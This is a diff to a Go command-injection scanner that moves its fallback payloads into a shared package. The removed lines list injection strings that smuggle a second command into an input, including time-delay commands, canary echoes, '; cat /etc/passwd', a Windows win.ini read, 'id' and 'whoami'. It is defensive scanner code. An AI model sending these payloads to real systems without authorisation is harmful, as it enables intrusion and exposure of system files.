@@ -113,7 +113,12 @@ func (m *CMDiScanner) getTimePayloads() []cmdiPayloadEntry {
 			return result
 		}
 	}
-	return defaultTimePayloads()
+	payload.LogFallbackOnce("cmdi")
+	var result []cmdiPayloadEntry
+	for _, v := range payload.MinimalCMDiTimePayloads() {
+		result = append(result, cmdiPayloadEntry{value: v, os: "linux", variant: "time"})
+	}
+	return result
 }
 
 func (m *CMDiScanner) getOutputPayloads(canary string) []cmdiPayloadEntry {
@@ -141,36 +146,12 @@ func (m *CMDiScanner) getOutputPayloads(canary string) []cmdiPayloadEntry {
 			return result
 		}
 	}
-	return defaultOutputPayloads(canary)
-}
-
-func defaultTimePayloads() []cmdiPayloadEntry {
-	return []cmdiPayloadEntry{
-		{"; sleep 5", "linux", "semicolon"},
-		{"| sleep 5", "linux", "pipe"},
-		{"|| sleep 5", "linux", "or"},
-		{"& sleep 5", "linux", "background"},
-		{"`sleep 5`", "linux", "backtick"},
-		{"$(sleep 5)", "linux", "subshell"},
-		{"\nsleep 5", "linux", "newline"},
-		{"& ping -n 5 127.0.0.1 &", "windows", "ping"},
-		{"| ping -n 5 127.0.0.1", "windows", "pipe-ping"},
-		{"; ping -c 5 127.0.0.1", "linux", "ping"},
-		{"& timeout /t 5 &", "windows", "timeout"},
+	payload.LogFallbackOnce("cmdi")
+	var result []cmdiPayloadEntry
+	for _, v := range payload.MinimalCMDiOutputPayloads(canary) {
+		result = append(result, cmdiPayloadEntry{value: v, os: "linux", variant: "echo"})
 	}
-}
-
-func defaultOutputPayloads(canary string) []cmdiPayloadEntry {
-	return []cmdiPayloadEntry{
-		{fmt.Sprintf("; echo %s", canary), "linux", "echo-semicolon"},
-		{fmt.Sprintf("| echo %s", canary), "linux", "echo-pipe"},
-		{fmt.Sprintf("$(echo %s)", canary), "linux", "echo-subshell"},
-		{fmt.Sprintf("`echo %s`", canary), "linux", "echo-backtick"},
-		{"; cat /etc/passwd", "linux", "passwd"},
-		{"| type C:\\Windows\\win.ini", "windows", "win-ini"},
-		{"; id", "linux", "id-cmd"},
-		{"| whoami", "both", "whoami"},
-	}
+	return result
 }
 
 func (m *CMDiScanner) testTimeBased(ctx context.Context, target *core.Target, point vulnkit.InjectionPoint) *core.Finding {
